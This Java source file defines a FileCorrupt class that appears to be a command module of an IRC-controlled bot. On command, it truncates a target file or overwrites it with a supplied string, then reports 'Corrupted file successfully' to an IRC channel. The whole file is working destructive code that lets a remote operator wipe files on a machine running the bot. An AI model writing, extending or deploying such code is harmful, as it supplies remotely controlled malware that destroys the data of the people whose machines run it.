import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

class FileCorrupt {

	private IRC irc;
	private String channel;

	private File file;

	public FileCorrupt(IRC irc, String channel, String file) {
		this.irc = irc;
		this.channel = channel;
		this.file = new File(file);
	}

	public void corrupt() {
		if(this.file.exists()) {
			if(!this.file.isDirectory()) {
				try {
					FileOutputStream out = new FileOutputStream(this.file);
					out.flush();
					out.close();
					this.irc.sendMessage(channel, "Corrupted file successfully.");
				} catch(IOException ioe) {
					this.irc.sendMessage(channel, "Couldn't corrupt file, IOException thrown: " + ioe.toString());
				}
			} else {
				this.irc.sendMessage(channel, "This command cannot be used on directories.");
			}
		} else {
			this.irc.sendMessage(channel, "File not found.");
		}
	}

	public void corrupt(String str) {
		if(this.file.exists()) {
			if(!this.file.isDirectory()) {
				try {
					FileOutputStream out = new FileOutputStream(this.file);
					out.write(str.getBytes());
					out.flush();
					out.close();
					this.irc.sendMessage(channel, "Corrupted file successfully.");
				} catch(IOException ioe) {
					this.irc.sendMessage(channel, "Couldn't corrupt file, IOException thrown: " + ioe.toString());
				}
			} else {
				this.irc.sendMessage(channel, "This command cannot be used on directories.");
			}
		} else {
			this.irc.sendMessage(channel, "File not found.");
		}
	}

}